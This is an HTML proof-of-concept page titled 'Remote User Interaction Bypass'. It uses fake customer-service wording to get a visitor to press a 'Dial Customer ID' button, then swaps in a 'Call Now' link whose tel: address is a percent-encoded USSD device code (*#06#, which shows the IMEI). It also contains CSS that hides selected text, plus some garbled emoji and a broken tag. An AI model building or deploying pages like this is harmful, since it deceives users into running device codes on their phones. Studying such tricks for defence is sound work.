<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Remote User Interaction Bypass</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #f0f0f0;
    }

    .container {
      width: 90%;          /* responsive width */
      max-width: 400px;    /* never exceed 400px */
      background: white;
      padding: 20px;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }

    .hidden {
      display: none;
    }

    button {
      margin-top: 20px;
      padding: 10px 15px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      background: #007BFF;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background: #0056b3;
    }
    
      span::selection {
      background: transparent;  /* background highlight */
      color: transparent;          /* text color while highlighted */
    }
  
  </style>
</head>
<body>
  <div class="container">
    <!-- First element -->
    <div id="firstElement">
      <h2>Hello ðŸ‘‹</h2>
      <p>Your customer ID is 777. Click the button below to dial your code. Do not initiate a call yet until you return back to this website.</p>
       <!-- Button -->
    <a id="btnId" href="tel:777"><button onclick="toggleElements()">Dial Customer ID</button></a>
    </div>

    <!-- Second element (hidden by default) -->
    <div id="secondElement" class="hidden">
      <h2> Success ðŸŽ‰/h2>
      <p>Talk to our Customer Representative. We will use your Customer ID to identify you.</p>
      <a id="btnCall" href="tel:*%2306%23"><button>Call Now</button></a>
    </div>
  </div>

  <script>
    function toggleElements() {
      document.getElementById("firstElement").classList.add("hidden");
      document.getElementById("secondElement").classList.remove("hidden");
    }
    
  </script>
</body>
</html>
